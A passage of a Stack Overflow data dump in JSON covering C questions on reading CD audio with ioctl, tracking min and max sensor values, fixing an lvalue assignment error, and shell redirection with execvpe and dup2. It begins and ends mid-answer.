//Provides open() and close()\n#include &lt;sys/types.h&gt;    //Provides file-related #defines and functions\n#include &lt;sys/stat.h&gt;     //Ditto\n#include &lt;fcntl.h&gt;        //Ditto\n#include &lt;stdlib.h&gt;       //Provides malloc()\n#include &lt;string.h&gt;       //Provides memset()\n#include &lt;stdint.h&gt;       //Provides uint8_t, etc\n#include &lt;errno.h&gt;        //Provides errno\n#include &lt;stdio.h&gt;        //Provides printf(), fprintf()\n\nint main() \n{\n  int fd = open(\"/dev/cdrom\", O_RDONLY | O_NONBLOCK);\n  if (errno != 0)\n  {\n    fprintf(stderr, \"Error opening file: %u\\n\", errno);\n    return -1;\n  }\n  struct cdrom_msf0 time; //The start read time ...\n  time.minute = 2;\n  time.second = 45;\n  time.frame = 0;\n  union cdrom_addr address;  //... in a union\n  address.msf = time;\n  struct cdrom_read_audio ra;  //Our data object\n  ra.addr = address;           //With the start time\n  ra.addr_format = CDROM_MSF;  //We used MSF\n  ra.nframes = CD_FRAMES;      //A second - 75 frames (the most we can read at a time anyway)\n  uint8_t* buff = malloc(CD_FRAMES * CD_FRAMESIZE_RAW); //Frames per second (75) * bytes per frame (2352)\n  memset(buff, 0, CD_FRAMES * CD_FRAMESIZE_RAW); //Make sure it's empty\n  ra.buf = buff;               //Set our buffer in our object\n  if (ioctl(fd, CDROMREADAUDIO, &amp;ra) != 0)  //The ioctl call\n  {\n    fprintf(stderr, \"Error giving ioctl command: %u\\n\", errno);\n    return -1;\n  }\n  for (int frame = 0; frame &lt; CD_FRAMES; frame++)  //A hexdump (could be a real use for the data)\n  {\n    printf(\"Frame %u:\", frame);\n    for (int byte = 0; byte &lt; CD_FRAMESIZE_RAW; byte++)\n    {\n      printf(\" %.2X\", buff[frame * CD_FRAMESIZE_RAW + byte]);\n    }\n    printf(\"\\n\");\n  }\n  close(fd);  //Close our file\n  return 0;   //And exit\n}\n</code></pre>\n\n<p>Make sure you use an audio CD, or the ioctl call will throw EIO (with a CD-ROM, for example). In reality, you might write this data to file, or process it. Either way, you'd likely end up reading more than one second using a loop.</p>\n"}], "owner": {"reputation": 11, "user_id": 7815485, "user_type": "registered", "profile_image": "https://graph.facebook.com/406757316362575/picture?type=large", "display_name": "Dihia", "link": "https://stackoverflow.com/users/7815485/dihia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 261, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1561126508, "creation_date": 1542226821, "last_edit_date": 1561126508, "question_id": 53308161, "link": "https://stackoverflow.com/questions/53308161/how-to-use-the-ioctl-function-with-audio-cd-drives", "title": "how to use the ioctl() function with audio CD drives", "body": "<p>I am trying to write a C program using the I/O call system in Ubuntu.</p>\n\n<p>I found this documentation, <a href=\"http://linux-sxs.org/bedtime/cdapi.html?fbclid=IwAR1ca7ht5jb8XpeHUuEfuZB85O3s2FBoNCkWa_Htm_GtQsit1Ea-SUfzqQ4\" rel=\"nofollow noreferrer\">CDROM API from Linux-sxs.org</a>, but I don't understand where to find those arguments.</p>\n\n<p>Can you please give me an example about how to use the <code>ioctl()</code> function? </p>\n\n<pre><code>struct cdrom_read_audio ra\n{\n    union cdrom_addr addr; /* REQUIRED frame address */\n    u_char addr_format; /* REQUIRED .....CDROM_LBA or CDROM_MSF */\n    int nframes;         /* REQUIRED number of 2352-byte-frames to read*/\n    u_char *buf;         /* REQUIRED frame buffer (size: nframes*2352 bytes) */\n};\n\nif (ioctl(cdrom, CDROMREADAUDIO, &amp;ra)&lt;0)\n{\n    perror(\"ioctl\");\n    exit(1);\n}\n</code></pre>\n"}, {"tags": ["c", "performance", "embedded"], "comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 3, "creation_date": 1542225462, "post_id": 53307859, "comment_id": 93496367, "body": "It&#39;s not entirely clear what you&#39;re asking - 1ms is <i>very</i> slow compared to a handful of comparison operations."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542225521, "post_id": 53307859, "comment_id": 93496385, "body": "How <b>slow</b> is you cpu?"}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 2, "creation_date": 1542225788, "post_id": 53307859, "comment_id": 93496514, "body": "If you are willing to scroll past the geeksforgeeks- and leetcode-garbage, a search for sliding window maximum in your favorite search engine may be helpful."}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1542227979, "post_id": 53307859, "comment_id": 93497514, "body": "Depending on the expected value range you&#39;re dealing with, there may be a clever solution that&#39;s faster than a simple ring buffer.  If you ask a generic question, you&#39;ll get a generic answer.  Add detail if you absolutely need to squeeze out performance for this particular problem."}, {"owner": {"reputation": 729, "user_id": 5135400, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/340af7d7f56355c39b56f926cae83c0d?s=128&d=identicon&r=PG&f=1", "display_name": "JohnDoe", "link": "https://stackoverflow.com/users/5135400/johndoe"}, "reply_to_user": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1542228781, "post_id": 53307859, "comment_id": 93497835, "body": "@paddy:  I removed some parts of the Question. Now assuming the factor embedded and time critical is here not relevant. Its now to the algorithm as itself."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1542230308, "post_id": 53307859, "comment_id": 93498473, "body": "After the 5 seconds, what happens next? Is that the end?  If the goal is an <i>ongoing</i> min/max of last 5 seconds, other approaches should be considered.  Does the min/max reset or should a min/max get outputted every millisecond after 5.0s?  Else all we have here of the min/max of 5000 samples."}, {"owner": {"reputation": 729, "user_id": 5135400, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/340af7d7f56355c39b56f926cae83c0d?s=128&d=identicon&r=PG&f=1", "display_name": "JohnDoe", "link": "https://stackoverflow.com/users/5135400/johndoe"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542230462, "post_id": 53307859, "comment_id": 93498543, "body": "@chux MIN and MAX is for statistic use and yes it will be output each 5s"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1542230591, "post_id": 53307859, "comment_id": 93498600, "body": "JohnDoe Then <a href=\"https://stackoverflow.com/a/53308546/2410359\">@chqrlie</a> has a good solution although I would initialize with <code>currentMIN = INT_MAX; currentMAX = INT_MIN;</code> and avoid magic numbers."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542236113, "post_id": 53308546, "comment_id": 93500708, "body": "chqrlie, true, if the first sample was the min value and all others larger, my suggestion would fail.  Removed."}, {"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "edited": false, "score": 0, "creation_date": 1542259199, "post_id": 53308546, "comment_id": 93506160, "body": "@chqrlie - regarding the reset of min and max after output. That would be as per the particular use case. It may or may not be required. In any case the rest of <code>acquisition_counter</code> is required"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 4, "last_activity_date": 1542235537, "last_edit_date": 1542235537, "creation_date": 1542228799, "answer_id": 53308546, "question_id": 53307859, "link": "https://stackoverflow.com/questions/53307859/fast-way-to-compare-frequent-input-data-and-storing-max-and-min-values/53308546#53308546", "title": "Fast way to compare frequent input data and storing MAX and MIN values", "body": "<p>It seems OK, there is not much to be optimized in your function, except for a few details:</p>\n\n<ul>\n<li>the return type should be <code>void</code> instead of omitted.</li>\n<li><code>a</code> is not defined.</li>\n<li>you should output <code>currentMIN</code> and <code>currentMAX</code> instead of <code>MIN</code> and <code>MAX</code>.</li>\n<li>you should reset the values of the min and max variables after the output.</li>\n<li>it is more idiomatic to ut the <code>static</code> keyword in front of the type.</li>\n</ul>\n\n<p>Here is the modified code:</p>\n\n<pre><code>void myMainFuntion(void) {\n    static int currentMIN = 30000; // Just initialize to a value that will never be output by getSensorData\n    static int currentMAX = 0;\n    static int acquisition_counter = 0;\n    int a;\n\n    a = getSensorData() // called every 1 ms\n    if (a &gt; currentMAX) {\n       currentMAX = a;\n    }\n    if (a &lt; currentMIN) {\n       currentMIN = a;  \n    }\n\n    acquisition_counter++;\n    if (acquisition_counter == 5000) {\n        output(currentMAX);\n        output(currentMIN);\n        currentMAX = 0;\n        currentMIN = 30000;\n        acquisition_counter = 0;\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 729, "user_id": 5135400, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/340af7d7f56355c39b56f926cae83c0d?s=128&d=identicon&r=PG&f=1", "display_name": "JohnDoe", "link": "https://stackoverflow.com/users/5135400/johndoe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "accepted_answer_id": 53308546, "answer_count": 1, "score": 1, "last_activity_date": 1542235537, "creation_date": 1542225328, "last_edit_date": 1542228909, "question_id": 53307859, "link": "https://stackoverflow.com/questions/53307859/fast-way-to-compare-frequent-input-data-and-storing-max-and-min-values", "title": "Fast way to compare frequent input data and storing MAX and MIN values", "body": "<p>Let's say I have input data every millisecond.\nAfter 5 seconds I want to output the MAX and MIN Value of the last 5 second time window.</p>\n\n<p>What will be here the fastest way to compare frequent integer input data? I put a very simple example. Is it bad to use something like this in general? Is there a faster way but without using array for buffering?</p>\n\n<pre><code>myMainFuntion() {\n    int static currentMIN = 30000; // Just initialize to a value that will never be output by getSensorData\n    int static currentMAX = 0;\n    int static acquisition_counter = 0;\n\n    a = getSensorData() // called each 1 ms\n    if (a &gt; currentMAX) {\n       currentMAX = a;\n    }\n\n    if (a &lt; currentMIN) {\n       currentMIN = a;  \n    }\n\n    acquisition_counter++;\n\n    if (acquisition_counter == 5000) {\n        output(MAX);\n        output(MIN);\n    }\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3, "user_id": 10625288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c94e330aeacc214fc5001fd91146c2e?s=128&d=identicon&r=PG&f=1", "display_name": "Grouchy_Gringo", "link": "https://stackoverflow.com/users/10625288/grouchy-gringo"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1542224700, "post_id": 53307648, "comment_id": 93496033, "body": "What do you mean?"}, {"owner": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 1, "creation_date": 1542224743, "post_id": 53307648, "comment_id": 93496042, "body": "That is an unfriendly comment. He is referring to <code>array1[i] + input = *tot</code>; That is not the correct synthatx."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1542224813, "post_id": 53307648, "comment_id": 93496076, "body": "You cannot assign a new value to things that are conceptually pure values. The abstract concept of the number &quot;3&quot; cannot be changed to have the value of the abstract concept of the number &quot;5&quot; without seriously compromising the fabric of thought and logic. Edit: This includes constructs like <code>1 + 2 = 5;</code>, which reduce to <code>3 = 5;</code> and are thus equally meaningless."}, {"owner": {"reputation": 3, "user_id": 10625288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c94e330aeacc214fc5001fd91146c2e?s=128&d=identicon&r=PG&f=1", "display_name": "Grouchy_Gringo", "link": "https://stackoverflow.com/users/10625288/grouchy-gringo"}, "edited": false, "score": 1, "creation_date": 1542225059, "post_id": 53307648, "comment_id": 93496160, "body": "Wrote the line &#39;array1[i] + input = *tot;&#39; incorrectly my fault. Wrote it so that the &#39;*tot&#39; to equal the operation. &#39;*tot = *tot + array1[i];&#39;"}, {"owner": {"reputation": 679, "user_id": 3264657, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/20c5379214923e99c21443dd4d3351f1?s=128&d=identicon&r=PG&f=1", "display_name": "Graph Theory", "link": "https://stackoverflow.com/users/3264657/graph-theory"}, "edited": false, "score": 0, "creation_date": 1542239980, "post_id": 53307648, "comment_id": 93501907, "body": "That change is a step in the right direction. Something else you should keep in mind when working with C is that local variables are not automatically initialized to 0. In other words, your &quot;avg&quot; and &quot;total&quot; variables have random garbage in them. It might be 0, but you can&#39;t count on it. It&#39;s good practice to initialize all variables.  Otherwise, how does your code look with the new change? Can you provide a specific input, the result, and what you expect?"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 10625288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c94e330aeacc214fc5001fd91146c2e?s=128&d=identicon&r=PG&f=1", "display_name": "Grouchy_Gringo", "link": "https://stackoverflow.com/users/10625288/grouchy-gringo"}, "edited": false, "score": 0, "creation_date": 1542225737, "post_id": 53307889, "comment_id": 93496485, "body": "Yes, thanks! I figured it out but that is an awesome explanation that definitely solidifies my understanding. I appreciate your answer greatly."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 1, "last_activity_date": 1542225974, "last_edit_date": 1542225974, "creation_date": 1542225441, "answer_id": 53307889, "question_id": 53307648, "link": "https://stackoverflow.com/questions/53307648/left-operand-must-be-l-value-looking-to-use-an-array-within-c-language/53307889#53307889", "title": "&#39;=&#39;: left operand must be l-value - Looking to use an Array within C Language", "body": "<p>The C assignment operator, <code>=</code>, assigns the result obtained by evaluating its right-hand operand to the <em>object</em> designated by its left-hand operand.  It follows that the expression serving as its left-hand operand must in fact designate an object -- <em>i.e.</em> it must identify storage, which is what it means to be an \"lvalue\".  In fact, that term comes from exactly this requirement: the 'l' is short for \"left\", as in the left operand of an assignment expression.</p>\n\n<p>The problematic statement is this one:</p>\n\n<pre><code>            array1[i] + input = *tot;\n</code></pre>\n\n<p>The left-hand operand of <code>=</code> is <code>array1[i] + input</code>, which is a valid expression, but <em>not</em> an lvalue.  You cannot assign to it, just like you cannot assign to <code>1 + 2</code> or <code>x * y</code>.</p>\n\n<p>It's unclear what you actually want to do here, but from the function name I'd guess that you want either</p>\n\n<pre><code>            input += array1[i];\n</code></pre>\n\n<p>or</p>\n\n<pre><code>            *tot += array1[i];\n</code></pre>\n\n<p>or both.</p>\n"}, {"comments": [{"owner": {"reputation": 3, "user_id": 10625288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c94e330aeacc214fc5001fd91146c2e?s=128&d=identicon&r=PG&f=1", "display_name": "Grouchy_Gringo", "link": "https://stackoverflow.com/users/10625288/grouchy-gringo"}, "edited": false, "score": 0, "creation_date": 1542226582, "post_id": 53307916, "comment_id": 93496865, "body": "This is awesome! Thank you so much for the input this really helped simplify the problem and explain it. Well done and thank you very much!"}], "tags": [], "owner": {"reputation": 2647, "user_id": 9829403, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-RvgmsYSS48c/AAAAAAAAAAI/AAAAAAAAAAw/pUPnPAhmDec/photo.jpg?sz=128", "display_name": "Tim Randall", "link": "https://stackoverflow.com/users/9829403/tim-randall"}, "is_accepted": false, "score": 1, "last_activity_date": 1542225582, "creation_date": 1542225582, "answer_id": 53307916, "question_id": 53307648, "link": "https://stackoverflow.com/questions/53307648/left-operand-must-be-l-value-looking-to-use-an-array-within-c-language/53307916#53307916", "title": "&#39;=&#39;: left operand must be l-value - Looking to use an Array within C Language", "body": "<p>I'm not sure what you were trying to do with this code.</p>\n\n<pre><code>array1[i] + input = *tot;\n</code></pre>\n\n<p>The problem with it is that <code>array1[i] + input</code> is not an <em>lvalue</em>, meaning that the left hand side of the <code>=</code> isn't an object that can store the value of the right hand side. It's just one of the numbers from the array, added to another number. That's what caused the error you were getting.</p>\n\n<p>... anyway, the task is quite simple if the task is done in two separate stages.</p>\n\n<ol>\n<li>Add up the values in the array to get the total</li>\n<li>Divide the total by the number of items to get the average</li>\n</ol>\n\n<p>Here's how I would do that.</p>\n\n<pre><code>void getTotalandAvg(int arr[], int siz, int* tot, int* avg)\n{\n    // count the total of all values\n    int total = 0;\n    for (int i = 0; i &lt; siz; i++)\n    {\n         total += arr[i];\n    }\n\n    // store the total\n    *tot = total;\n    // calculate and store the average\n    *avg = total / siz;\n}\n</code></pre>\n\n<p>Note that the average is going to be rounded down to an integer value. If you prefer it to be rounded up, you could calculate the average using the expression <code>(total+(siz-1))/siz</code> instead.\nNote, too, that I deliberately altered the names of the variables so that there's no risk of confusing local variables and parameters from global variables or variables that are local to the calling function. I've found that this avoids a lot of potential grief in the long run.</p>\n"}, {"tags": [], "owner": {"reputation": 400, "user_id": 8500049, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2ed9fd618fc5fc89e9f9795aa143e6b2?s=128&d=identicon&r=PG&f=1", "display_name": "User8500049", "link": "https://stackoverflow.com/users/8500049/user8500049"}, "is_accepted": false, "score": -1, "last_activity_date": 1542226757, "creation_date": 1542226757, "answer_id": 53308142, "question_id": 53307648, "link": "https://stackoverflow.com/questions/53307648/left-operand-must-be-l-value-looking-to-use-an-array-within-c-language/53308142#53308142", "title": "&#39;=&#39;: left operand must be l-value - Looking to use an Array within C Language", "body": "<p>I want to add something @john-bulliger answer. Because the array name also l value expressin, but you can\u2019t use like left operand of assignment.\nI  have used &amp; operator for specifing value type of expression. If you used expression with &amp; operator and there is no mistake, this expression must be l value expression. Otherwise expression must be r value</p>\n"}], "owner": {"reputation": 3, "user_id": 10625288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c94e330aeacc214fc5001fd91146c2e?s=128&d=identicon&r=PG&f=1", "display_name": "Grouchy_Gringo", "link": "https://stackoverflow.com/users/10625288/grouchy-gringo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 0, "accepted_answer_id": 53307889, "answer_count": 3, "score": 0, "last_activity_date": 1542226757, "creation_date": 1542224429, "last_edit_date": 1542225633, "question_id": 53307648, "link": "https://stackoverflow.com/questions/53307648/left-operand-must-be-l-value-looking-to-use-an-array-within-c-language", "title": "&#39;=&#39;: left operand must be l-value - Looking to use an Array within C Language", "body": "<p>I am trying to get the user to input specific values into an array, and get \"Total\" back of all the integers. Here are the specific parameters. </p>\n\n<ul>\n<li>Main() asks the user to enter the size of the array</li>\n<li>Main() asks the user to enter the random values</li>\n<li>Main() calls other worker functions and displays the results</li>\n<li>Worker functions should match these specs: </li>\n</ul>\n\n<p>o   getTotalAndAverage()\ntakes int array and size, total and average by reference - returns a void</p>\n\n<p>I'm only trying to do the total piece as of now, just to understand what I'm executing incorrectly. Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid getTotalandAvg(int array1[], int size, int* tot, int* avg);\n\n\nint main() {\n    int size, input, avg;\n    int total;\n    int array1[10000];\n    printf(\"Please Enter a Size: \");\n    scanf_s(\"%d\", &amp;size);\n\n    for (int i = 0; i &lt; size; i++) {\n        printf(\"Please Enter Value: \");\n        scanf_s(\"%d\", &amp;input);\n        array1[i] = input;\n    }\n    getTotalandAvg(array1, size, &amp;total, &amp;avg);\n    printf(\"%d\", total);\n\n    system(\"pause\");\n    return 0;\n}\n\nvoid getTotalandAvg(int array1[], int size, int* tot, int* avg) {\n    int input = 0;\n    for (int i = 0; i &lt; size; i++) {\n         array1[i] + input = *tot;\n    }\n\n}\n</code></pre>\n"}, {"tags": ["c", "process"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1542223945, "post_id": 53307488, "comment_id": 93495697, "body": "Please post code as text rather than pictures."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1542224194, "post_id": 53307488, "comment_id": 93495804, "body": "Ref <a href=\"https://linux.die.net/man/3/execvpe\" rel=\"nofollow noreferrer\">execvpe(3) - Linux man page</a>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1542224265, "post_id": 53307488, "comment_id": 93495834, "body": "<code>&quot;.&#47;Solution&quot;, &quot;&lt;&quot;, &quot;&#47;input&#47;1.txt&quot;, &quot;&amp;&gt;&quot;, &quot;&#47;stdout&#47;1.txt</code> needs to go though command processing.  Example: <code>&quot;&lt;&quot;</code> is not the first arg to <code>&quot;.&#47;Solution&quot;</code>."}, {"owner": {"reputation": 1149, "user_id": 2472827, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5rYY.jpg?s=128&g=1", "display_name": "Neil", "link": "https://stackoverflow.com/users/2472827/neil"}, "edited": false, "score": 0, "creation_date": 1542224301, "post_id": 53307488, "comment_id": 93495848, "body": "The pipe is the shell&#39;s symbol, not actually a low-level command."}, {"owner": {"reputation": 216, "user_id": 7871971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1043c36db0dd84fab919fd9b8df32052?s=128&d=identicon&r=PG&f=1", "display_name": "SamratV", "link": "https://stackoverflow.com/users/7871971/samratv"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542224375, "post_id": 53307488, "comment_id": 93495885, "body": "@chux I am not getting what you are trying to say"}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 4, "creation_date": 1542224433, "post_id": 53307488, "comment_id": 93495914, "body": "When you do in shell <code>.&#47;code&#47;Solution &lt; &#47;input&#47;1.txt &amp;&gt; &#47;stdout&#47;1.txt</code> you run a program from <code>.&#47;code&#47;Solution</code> with <b>no arguments</b> with stdin binded from /input/1.txt file and stdout and stderr binded to /stdout/1.txt. You can recreate that with <code>fork</code> + <code>dup</code> and <code>exec</code>. With execvpe you can run /bin/sh with proper arguments <code>{&quot;-c&quot;, &quot;\\&quot;.&#47;code&#47;Solution &lt; .... \\&quot;&quot;}</code> or you need to call <code>dup</code>  to bind your stdout and stderr and stdin and then call execvpe."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542224542, "post_id": 53307488, "comment_id": 93495962, "body": "@chux I don&#39;t believe the program name is the problem. The absolute paths on the other hand..."}, {"owner": {"reputation": 216, "user_id": 7871971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1043c36db0dd84fab919fd9b8df32052?s=128&d=identicon&r=PG&f=1", "display_name": "SamratV", "link": "https://stackoverflow.com/users/7871971/samratv"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542224575, "post_id": 53307488, "comment_id": 93495977, "body": "@KamilCuk can you please explain or refer something. I am pretty much inexperienced in this part of C programming."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 1, "creation_date": 1542224696, "post_id": 53307488, "comment_id": 93496031, "body": "It&#39;s not C, it&#39;s your shell. See <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_07\" rel=\"nofollow noreferrer\">POSIX shell manual</a> section 2.7.1. and 2.7.2. and the whole redirection section. The <code>&amp;&gt;</code> is something from C Shell and means to redirect both 1 and 2 file descriptor, ie same as <code>&gt; file 2&gt;&amp;1</code>"}], "answers": [{"comments": [{"owner": {"reputation": 216, "user_id": 7871971, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1043c36db0dd84fab919fd9b8df32052?s=128&d=identicon&r=PG&f=1", "display_name": "SamratV", "link": "https://stackoverflow.com/users/7871971/samratv"}, "edited": false, "score": 1, "creation_date": 1542226099, "post_id": 53307709, "comment_id": 93496666, "body": "Thank you @PSkocik"}], "tags": [], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "is_accepted": true, "score": 4, "last_activity_date": 1542224694, "creation_date": 1542224694, "answer_id": 53307709, "question_id": 53307488, "link": "https://stackoverflow.com/questions/53307488/how-to-use-execvpe-in-c-correctly/53307709#53307709", "title": "How to use execvpe() in C correctly?", "body": "<p>Redirection operators aren't arguments that get passed to the kernel.\nThey're a shell language feature.</p>\n\n<p><code>&lt; /input/1.txt</code>  or more explicitly <code>0&lt;/input/1.txt</code> means approximately (report errors according to your own preferences):</p>\n\n<pre><code>int fd;\nif(0&gt;(fd=open(\"/input/1.txt\",O_RDONLY))){ perror(\"open\"); /*...*/ }\nif(0&gt;dup2(fd,0)){ perror(\"dup\"); /*...*/ }\nif(fd!=0) close(fd);\n</code></pre>\n\n<p>while <code>&amp;&gt;/stdout/1.txt</code> or more POSIXly/explictly <code>1&gt; /stdout/1.txt 2&gt;&amp;1</code> means</p>\n\n<pre><code>// 1&gt; 